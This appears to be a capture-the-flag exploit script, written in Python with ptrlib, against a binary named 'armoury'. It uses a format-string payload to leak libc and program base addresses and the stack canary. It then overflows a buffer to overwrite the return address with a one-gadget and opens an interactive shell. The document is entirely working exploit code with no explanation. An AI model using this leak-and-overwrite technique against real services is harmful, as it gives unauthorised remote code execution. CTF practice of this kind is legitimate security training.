from ptrlib import *

#sock = Socket("159.89.166.12", 16000)
sock = Socket("localhost", 16000)
elf = ELF("./armoury")

# leak proc_base and libc_base
sock.recvuntil("info:\n")
sock.sendline("%15$p.%19$p.%13$p.")
sock.recvuntil("-\n")
addrlist = sock.recvline().split(b".")
addr_libc_start_main = int(addrlist[0], 16)
addr_main = int(addrlist[1], 16)
canary = int(addrlist[2], 16)
proc_base = addr_main - elf.symbol('main')
libc_base = addr_libc_start_main - 0x021b97
print("[+] libc_base = " + hex(libc_base))
print("[+] proc_base = " + hex(proc_base))
print("[+] canary = " + hex(canary))

# calc something...
addr_system = libc_base + 0x04f440
addr_binsh = libc_base + 0x1b3e9a
addr_rce = libc_base + 0x4f2c5 # one gadget rce

# overwrite ret addr
payload = "A" * 0x27
payload += p64(canary).replace('\x00', 'A') # temp canary
payload += "A" * 8
payload += p64(addr_rce)
sock.recvuntil("info:\n")
sock.sendline(payload)

# set correct canary
payload = "A" * 0x18
sock.recvuntil("feedback:\n")
sock.sendline(payload)

sock.interactive()
